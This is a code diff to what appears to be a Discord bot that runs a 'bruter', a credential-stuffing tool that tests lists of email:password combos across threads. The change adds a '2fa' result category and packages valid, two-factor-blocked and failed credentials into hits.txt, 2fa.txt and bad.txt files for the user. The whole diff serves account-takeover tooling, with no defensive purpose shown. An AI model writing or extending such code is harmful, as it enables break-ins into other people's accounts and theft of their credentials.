@@ -1139,12 +1139,14 @@ async function handleBruv1(respond, userId, accountsRaw, accountsFile, threads =
       embeds: [bruterProgressEmbed({ completed: 0, total: accounts.length, hits: 0, bad: 0, elapsed: 0, username: dmUser?.username })],
     });
 
-    let hitCount = 0, badCount = 0;
+    let hitCount = 0, badCount = 0, tfaCount = 0;
 
     const results = await runBruter(
       accounts, threads,
       (r, done, total) => {
-        if (r?.status === "hit") hitCount++; else badCount++;
+        if (r?.status === "hit") hitCount++;
+        else if (r?.status === "2fa") tfaCount++;
+        else badCount++;
         if (done % 5 === 0 || done === total) {
           updateProgress(msg, bruterProgressEmbed({
             completed: done, total, hits: hitCount, bad: badCount,
@@ -1160,11 +1162,15 @@ async function handleBruv1(respond, userId, accountsRaw, accountsFile, threads =
 
     const elapsed = Date.now() - startTime;
     const hits = results.filter((r) => r.status === "hit");
-    const bads = results.filter((r) => r.status !== "hit");
+    const tfas = results.filter((r) => r.status === "2fa");
+    const bads = results.filter((r) => r.status !== "hit" && r.status !== "2fa");
 
     const zipEntries = [];
     if (hits.length > 0) {
       zipEntries.push({ name: "hits.txt", content: hits.map((r) => `${r.email}:${r.password}`).join("\n") });
+    }
+    if (tfas.length > 0) {
+      zipEntries.push({ name: "2fa.txt", content: tfas.map((r) => `${r.email}:${r.password}`).join("\n") });
     }
     if (bads.length > 0) {
       zipEntries.push({ name: "bad.txt", content: bads.map((r) => `${r.email}:${r.password}`).join("\n") });
